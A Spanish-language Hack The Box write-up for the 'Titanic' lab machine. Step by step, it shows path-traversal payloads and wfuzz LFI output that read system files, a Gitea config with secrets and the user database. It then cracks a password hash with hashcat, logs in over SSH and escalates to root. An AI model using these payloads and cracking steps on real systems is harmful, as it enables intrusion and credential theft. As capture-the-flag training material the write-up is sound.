**Máquina:** Titanic
**Plataforma:** Hack The Box

**Laboratorio:** https://app.hackthebox.com/machines/Titanic

**Target:** 10.10.11.55

**/etc/hosts:** 10.10.11.55   titanic.htb dev.titanic.htb gitea.titanic.htb

---
# Guía de explotación paso a paso 'Titanic'

## Paso 1 -

Acción: escaneo inicial con nmap

```Shell
nmap -p- --open -sS -n -Pn --min-rate 5000 -vvv 10.10.11.55 -oG allPorts
```

Resultado:

```Shell
IP Address: 10.10.11.55
Open ports: 22,80
```

Explicación: escaneo de todos los puertos abiertos (TCP), guardamos resultado en un archivo grepeable con `oG allPorts`

## Paso 2 -

Acción: añadir a `/etc/hosts` el dominio encontrado en el puerto `80`

```Shell
nvim /etc/hosts
```

Resultado:

```lua
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.55   titanic.htb
```

Explicación: para poder resolver el dominio encontrado en el puerto 80 necesitamos añadir al `/etc/hosts` la ruta tal como se indica.

**Nota:** se recomienda mantener un archivo limpio y al acabar con el ejercicio eliminar la línea creada


## Paso 3 -

Acción: análisis de tecnologías con *whatweb*

```Shell
whatweb http://titanic.htb/
```

Resultado:

```Shell
http://titanic.htb/ [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
```

Análisis: *Werkzeug ¿qué es?*

> Werkzeug es un conjunto de bibliotecas utilizadas para crear una aplicación web compatible con WSGI (Web Server Gateway Interface) en Python. No proporciona una clase de alto nivel, como Flask, para estructurar una aplicación web completa. En cambio, se necesita crear la aplicación por sí mismo utilizando las bibliotecas de Werkzeug.
>
> Werkzeug proporciona una serie de utilidades para crear una aplicación de Python que pueda comunicarse con un servidor WSGI, como Gunicorn. También incluye un servidor de desarrollo básico con recarga caliente.

Explicación: localizamos un punto de apoyo desde el que iniciar un ataque, detectar el gestor de contenido que corre por detrás del dominio encontrado puede ser clave para explotar vulnerabilidades de versiones desactualizadas


## Paso 4 -

Acción: búsqueda por internet de *Werkzeug/3.0.3*

```url
https://www.rapid7.com/db/modules/exploit/multi/http/werkzeug_debug_rce/
```

Resultado:

```txt
Este módulo explotará la consola de depuración de Werkzeug para colocar un shell de Python.
```

Explicación: la versión que utiliza este dominio esta desactualizada y es vulnerable a ejecutar un *RCE* desde Python, lo que puede derivar en una elevación de privilegios


## Paso 5 -

Acción: 

```Shell
gobuster dir -u http://titanic.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50
```

Resultado:

```Shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/book                 (Status: 405) [Size: 153]
/download             (Status: 400) [Size: 41]
/server-status        (Status: 403) [Size: 276]
```

Explicación: posible rutas a explotar


## Paso 6 -

Acción: 

```url
http://titanic.htb/download  
```

Resultado:

```json
error: "Ticket parameter is required"
```

Explicación: esta ruta parece requerir de un *parametro ticket*


## Paso 7 -

Acción: 

```url 
http://titanic.htb/download?ticket=1234 
```

Resultado:

```json 
error:	"Ticket not found"
```

Explicación: efectivamente la respuesta cambia al introducir un parametro ticker, aunque parece no ser válido


## Paso 8 -

Acción: 

```Shell
http://titanic.htb/download?ticket=../../../etc/passwd  
```

Resultado:

```Shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

**Nota:** los usuarios `root`y `developer` tienen acceso a una `/bin/bash`

Explicación: tenemos capacidad de hacer *path traversal* 


## Paso 9 -

Acción: 

```Shell
wfuzz -u 'http://titanic.htb/download?ticket=FUZZ' -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404
```

Resultado:

```Shell
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://titanic.htb/download?ticket=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000020:   200        36 L     50 W       1951 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                                 
000000017:   500        5 L      37 W       265 Ch      "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"                                   
000000016:   200        36 L     50 W       1951 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                   
000000023:   200        36 L     50 W       1951 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                                              
000000021:   500        5 L      37 W       265 Ch      "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow"                                                 
000000024:   500        5 L      37 W       265 Ch      "..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow"                                                                              
000000138:   200        62 L     62 W       818 Ch      "/etc/group"                                                                                                          
000000135:   200        11 L     82 W       496 Ch      "/etc/fstab"                                                                                                          
000000131:   200        23 L     206 W      1136 Ch     "/etc/crontab"                                                                                                        
000000129:   200        42 L     275 W      2377 Ch     "/etc/apt/sources.list"                                                                                               
000000121:   200        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"                                                                                           
000000118:   500        5 L      37 W       265 Ch      "../../../../../../../dev"                                                                                            
000000205:   200        9 L      27 W       250 Ch      "/etc/hosts"                                                                                                          
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                                                     
000000206:   200        9 L      27 W       250 Ch      "../../../../../../../../../../../../etc/hosts"                                                                       
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"                                                                                                    
000000237:   200        2 L      5 W        26 Ch       "/etc/issue"                                                                                                          
000000236:   200        355 L    1050 W     8181 Ch     "/etc/init.d/apache2"                                                                                                 
000000260:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                              
000000248:   200        23 L     134 W      839 Ch      "/etc/mysql/my.cnf"                                                                                                   
000000268:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../etc/passwd"                                                                      
000000267:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                   
000000266:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                
000000264:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                          
000000263:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                       
000000265:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                             
000000262:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                    
000000258:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                        
000000257:   200        36 L     50 W       1951 Ch     "/etc/passwd"                                                                                                         
000000259:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                           
000000261:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                 
000000253:   200        36 L     50 W       1951 Ch     "/./././././././././././etc/passwd"                                                                                   
000000254:   200        36 L     50 W       1951 Ch     "/../../../../../../../../../../etc/passwd"                                                                           
000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                                                                      
000000250:   200        20 L     63 W       510 Ch      "/etc/nsswitch.conf"                                                                                                  
000000271:   200        36 L     50 W       1951 Ch     "../../../../../../../../../etc/passwd"                                                                               
000000269:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../../etc/passwd"                                                                         
000000275:   200        36 L     50 W       1951 Ch     "../../../../../etc/passwd"                                                                                           
000000277:   200        36 L     50 W       1951 Ch     "../../../etc/passwd"                                                                                                 
000000276:   200        36 L     50 W       1951 Ch     "../../../../etc/passwd"                                                                                              
000000274:   200        36 L     50 W       1951 Ch     "../../../../../../etc/passwd"                                                                                        
000000270:   200        36 L     50 W       1951 Ch     "../../../../../../../../../../etc/passwd"                                                                            
000000273:   200        36 L     50 W       1951 Ch     "../../../../../../../etc/passwd"                                                                                     
000000272:   200        36 L     50 W       1951 Ch     "../../../../../../../../etc/passwd"                                                                                  
000000311:   200        36 L     50 W       1951 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                          
000000413:   500        5 L      37 W       265 Ch      "../../../../../../../../../../../../etc/shadow"                                                                      
000000412:   500        5 L      37 W       265 Ch      "/etc/shadow"                                                                                                         
000000409:   500        5 L      37 W       265 Ch      "/../../../../../../../../../../etc/shadow"                                                                           
000000408:   500        5 L      37 W       265 Ch      "/./././././././././././etc/shadow"                                                                                   
000000400:   200        40 L     117 W      887 Ch      "/etc/rpc"                                                                                                            
000000399:   200        23 L     142 W      920 Ch      "/etc/resolv.conf"                                                                                                    
000000423:   500        5 L      37 W       265 Ch      "/etc/sudoers"                                                                                                        
000000422:   200        122 L    387 W      3252 Ch     "/etc/ssh/sshd_config"                                                                                                
000000498:   200        0 L      0 W        0 Ch        "/proc/interrupts"                                                                                                    
000000504:   200        0 L      0 W        0 Ch        "/proc/net/route"                                                                                                     
000000503:   200        0 L      0 W        0 Ch        "/proc/net/dev"                                                                                                       
000000501:   200        0 L      0 W        0 Ch        "/proc/mounts"                                                                                                        
000000497:   200        0 L      0 W        0 Ch        "/proc/cpuinfo"                                                                                                       
000000502:   200        0 L      0 W        0 Ch        "/proc/net/arp"                                                                                                       
000000500:   200        0 L      0 W        0 Ch        "/proc/meminfo"                                                                                                       
000000499:   200        0 L      0 W        0 Ch        "/proc/loadavg"                                                                                                       
000000505:   200        0 L      0 W        0 Ch        "/proc/net/tcp"                                                                                                       
000000507:   200        0 L      0 W        0 Ch        "/proc/self/cmdline"                                                                                                  
000000510:   200        0 L      0 W        0 Ch        "/proc/version"                                                                                                       
000000509:   200        0 L      0 W        0 Ch        "/proc/self/status"                                                                                                   
000000506:   200        0 L      0 W        0 Ch        "/proc/partitions"                                                                                                    
000000508:   200        0 L      0 W        0 Ch        "/proc/self/environ"                                                                                                  
000000674:   500        5 L      37 W       265 Ch      "/var/log/dmesg"                                                                                                      
000000640:   500        5 L      37 W       265 Ch      "/var/log"                                                                                                            
000000671:   500        5 L      37 W       265 Ch      "/var/log/auth.log"                                                                                                   
000000698:   500        5 L      37 W       265 Ch      "/var/log/kern.log"                                                                                                   
000000699:   200        0 L      2 W        292292 Ch   "/var/log/lastlog"                                                                                                    
000000741:   200        16 L     40 W       11520 Ch    "/var/log/wtmp"                                                                                                       
000000750:   200        6 L      12 W       1920 Ch     "/var/run/utmp"                                                                                                       
000000736:   500        5 L      37 W       265 Ch      "/var/log/syslog"                                                                                                     
000000929:   200        36 L     50 W       1951 Ch     "///////../../../etc/passwd"                                                                                          

Total time: 24.41933
Processed Requests: 929
Filtered Requests: 853
Requests/sec.: 38.04363
```

**Nota:** la ruta `/etc/hosts` contiene un subdominio no explorado aún (*dev.titanic.hdb*)


Explicación: con *Wfuzz* obtenemos diferentes rutas en las que buscar


## Paso 10 -

Acción: 

```html 
GET /download?ticket=../../../etc/crontab HTTP/1.1
```

Resultado:

```html 
HTTP/1.1 200 OK

Date: Thu, 24 Apr 2025 01:40:00 GMT

...

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

Explicación: probando una de las rutas encontramos una tarea *crontab* ejecutándose


## Paso 11 -

Acción: 

```url 
/etc/hosts
```

Resultado:

```Shell
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Explicación: obtenemos un subdominio que si añadimos a nuestro `/etc/hosts` podemos acceder desde nuestro navegador


## Paso 12 -

Acción: acedemos a la pestaña *explore*

```url 
http://dev.titanic.htb/explore/repos 

```

Acción:

```url 
http://dev.titanic.htb/developer/flask-app/src/branch/main/tickets 
```

Resultado:

```xml
2d46c7d1-66f4-43db-bfe4-ccbb1a5075f2.json 	Add tickets/2d46c7d1-66f4-43db-bfe4-ccbb1a5075f2.json 	2024-08-02 11:37:58 +00:00
e2a629cd-96fc-4b53-9009-4882f8f6c71b.json 	Add tickets/e2a629cd-96fc-4b53-9009-4882f8f6c71b.json 
```

Resultado:

```json 
{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
```

Explicación: hemos encontrado tickets válidos que podemos probar en la url que intentabamos al principio y acceder de esta forma como usuarios


## Paso 13 - 

Acción: nos registramos en esta ruta y tenemos capacidad de logearnos

```url
http://dev.titanic.htb/user/sign_up 
```

Resultado: ganamos acceso a un docker de gitea (similar a GitHub)

```url
http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml
```

Explicación: tras ganar acceso como usuario a esta página ahora podemos probar a subir archivos maliciosos o ejecutar comandos o probar XSS


## Paso 14 - 

Acción: 

```xml 
GET /download?ticket=../../../home/developer/user.txt
```

Resultado: 

```xml  
HTTP/1.1 200 OK

Date: Thu, 24 Apr 2025 17:42:20 GMT

Server: Werkzeug/3.0.3 Python/3.10.12

Content-Disposition: attachment; filename="../../../home/developer/user.txt"

Content-Type: text/plain; charset=utf-8

Content-Length: 33

Last-Modified: Thu, 24 Apr 2025 15:50:17 GMT

Cache-Control: no-cache

ETag: "1745509817.344741-33-2595819779"

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive



f5abad40adc0e95946311...
```

Explicación: sacamos la ruta que necesitábamos desde este archivo: `docker-config`

```shell 
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

## Paso 15 - 

Acción: 

```xml  
GET /download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
```

Resultado: ahora que sabemos una ruta posible, apuntamos a un archivo común en este servicio: *home/developer/gitea/data/gitea/conf/app.ini*

```xml  
HTTP/1.1 200 OK

Date: Thu, 24 Apr 2025 17:47:30 GMT

Server: Werkzeug/3.0.3 Python/3.10.12

Content-Disposition: attachment; filename="../../../home/developer/gitea/data/gitea/conf/app.ini"

Content-Type: application/octet-stream

Content-Length: 2004

Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT

Cache-Control: no-cache

ETag: "1722595334.8970726-2004-1306138741"

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive



APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

Explicación: destacamos esta ruta con posibilidad de descargar una base de datos la cual ejecutar con *sqlite*: `/data/gitea/gitea.db`


## Paso 16 - 

Acción: 

```xml 
GET /download?ticket=../../../home/developer/gitea/data/gitea/gitea.db HTTP/1.1
```

Resultado: 

```xml  

!user123user123user@user.comenabled24d2ac995e818c64d8256923ebd5ba601fe29eb25ac5c46954c311685448e39ed07eb6c5eaf29d94bef83aa4928226ef80f0pbkdf2$50000$50440d0d61d2bf04ca8c07437b3d0b0230771096fa8ba6d019a3c1c04769a0dcacen-USh
^ãh
^êh
^ãÿ88b87698be0bc461f3cacf1f080929d5user@user.comgitea-auto`0
```

Explicación: encontramos hasheados algunos usuarios y posibles credenciales


## Paso 17 - 

Acción: 

```Shell 
curl -X GET "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" \
-H "Host: titanic.htb" \
--output gitea.db
```

Alternativa:

```SHELL
curl -X GET "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" -H "Host: titanic.htb" --output gitea.db
```

Resultado: 

```Shell 
gitea.db
```

Explicación: hemos podido descargar conc *curl* la base de datos que vimos anteriormente


## Paso 18 - 

Acción: 

```Shell 
sqlite3 gitea.db
```

Acción:

```SHELL
sqlite> select * from user;
```

Resultado: 

```Shell 
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|metahumo|metahumo||metahumo@metahumo.com|0|enabled|8ab9289acbdff7a328394d3214b33e367119776b3ca92826f5b62a97f4d8b796b66d57370c9ba6ea1820b71352c66db2f1fd|pbkdf2$50000$50|0|0|0||0|||32f0c010731ee34b56a3892eb61f917a|5711c0fbfa7b2bc5a6a1f2046c21480b|en-US||1745509867|1745513487|1745513487|0|-1|1|0|0|0|0|1|0|2974ce2d4086eaaae7b952af8059e081|metahumo@metahumo.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
4|user123|user123||user@user.com|0|enabled|24d2ac995e818c64d8256923ebd5ba601fe29eb25ac5c46954c311685448e39ed07eb6c5eaf29d94bef83aa4928226ef80f0|pbkdf2$50000$50|0|0|0||0|||440d0d61d2bf04ca8c07437b3d0b0230|771096fa8ba6d019a3c1c04769a0dcac|en-US||1745510115|1745510122|1745510115|0|-1|1|0|0|0|0|1|0|88b87698be0bc461f3cacf1f080929d5|user@user.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
```

Explicación:

## Paso 19 - 

Acción: descargamos el siguiente script en python para extraer hashed y poder usarlo con `hashcat`

```Shell 
wget https://gist.githubusercontent.com/h4rithd/0c5da36a0274904cafb84871cf14e271/raw/f109d178edbe756f15060244d735181278c9b57e/gitea2hashcat.py
python3 gitea2hashcat.py gitea.db > hashes.txt
```

Resultado:

```Shell
sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:VxHA+/p7K8WmofIEbCFICw==:irkomsvf96MoOU0yFLM+NnEZd2s8qSgm9bYql/TYt5a2bVc3DJum6hggtxNSxm2y8f0=
sha256:50000:dxCW+oum0BmjwcBHaaDcrA==:JNKsmV6BjGTYJWkj69W6YB/inrJaxcRpVMMRaFRI457QfrbF6vKdlL74OqSSgibvgPA=
```

Explicación: tenemos un hashes.txt archivo con los hashes asociados a todos los usuarios de la plataforma, como el segundo hash corresponde al usuario 'developer' copiamos toda la línea y la guardamos en un archivo llamado developer_hash.txt


## Paso 20 - 

Acción: 

```Shell 
hashcat -m 10900 developer_hash.txt /usr/share/wordlists/rockyou.txt
```

Resultado: 

```Shell 
OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-12th Gen Intel(R) Core(TM) i5-1235U, 1424/2913 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqc...lM+1Y=
Time.Started.....: Thu Apr 24 20:14:14 2025 (22 secs)
Time.Estimated...: Thu Apr 24 20:14:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      254 H/s (10.34ms) @ Accel:128 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5632/14344385 (0.04%)
Rejected.........: 0/5632 (0.00%)
Restore.Point....: 5376/14344385 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:49664-49999
Candidate.Engine.: Device Generator
Candidates.#1....: ghetto1 -> katana
Hardware.Mon.#1..: Util: 90%

Started: Thu Apr 24 20:13:20 2025
Stopped: Thu Apr 24 20:14:39 2025
```

Explicación: obtenemos la password de developer: *25282528*


## Paso 21 - 

Acción: 

```Shell 
ssh developer@10.10.11.55
```

Resultado: 

```Shell 
developer@titanic:~$ whoami
developer
```

Explicación: obtenemos acceso al servidor con una shell, somos el usuario developer


## Paso 22 -

Acción: buscamos formas de elevar nuestros privilegios 

```Shell 
developer@titanic:~$ sudo -l
```

Resultado:

```Shell 
Matching Defaults entries for developer on titanic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on titanic:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

Acción:

```Shell 
developer@titanic:~$ sudo /usr/bin/bash
root@titanic:/home/developer# whoami
root
root@titanic:/home/developer# cd
root@titanic:~# ls
cleanup.sh  images  revert.sh  root.txt  snap
root@titanic:~# cat root.txt 
eada467fe1d9c6f8f39f305a869af988
```

---
